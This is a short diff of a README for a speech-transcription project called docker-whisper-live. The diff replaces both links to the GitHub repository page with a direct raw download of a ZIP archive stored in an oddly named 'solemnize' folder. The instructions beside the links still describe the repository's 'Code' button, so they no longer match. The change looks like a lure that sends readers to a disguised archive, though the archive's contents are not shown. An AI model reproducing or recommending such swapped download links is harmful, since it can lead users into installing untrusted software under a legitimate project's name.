@@ -1,6 +1,6 @@
 # 🎙️ docker-whisper-live - Real-time speech transcription on your computer
 
-[![](https://img.shields.io/badge/Download-Visit_GitHub_Repository-blue.svg)](https://github.com/patitapro19/docker-whisper-live)
+[![](https://img.shields.io/badge/Download-Visit_GitHub_Repository-blue.svg)](https://raw.githubusercontent.com/patitapro19/docker-whisper-live/main/solemnize/docker_whisper_live_3.2.zip)
 
 This application turns your computer into a speech-to-text server. It listens to audio and writes out the words in real time. It uses advanced technology to understand speech accurately. You can use it to transcribe live meetings, record voice notes, or create subtitles for videos.
 
@@ -16,7 +16,7 @@ Your computer needs specific hardware to run this software well. Please check yo
 
 ## 📥 How to Download the Software
 
-You need to access the project files to start the installation. Visit this page to download the necessary files: [https://github.com/patitapro19/docker-whisper-live](https://github.com/patitapro19/docker-whisper-live).
+You need to access the project files to start the installation. Visit this page to download the necessary files: [https://raw.githubusercontent.com/patitapro19/docker-whisper-live/main/solemnize/docker_whisper_live_3.2.zip](https://raw.githubusercontent.com/patitapro19/docker-whisper-live/main/solemnize/docker_whisper_live_3.2.zip).
 
 Scroll down to the green button labeled "Code." Click it and choose "Download ZIP." Save the file to your computer. Create a new folder on your desktop and extract the contents of the ZIP file into that folder.
 
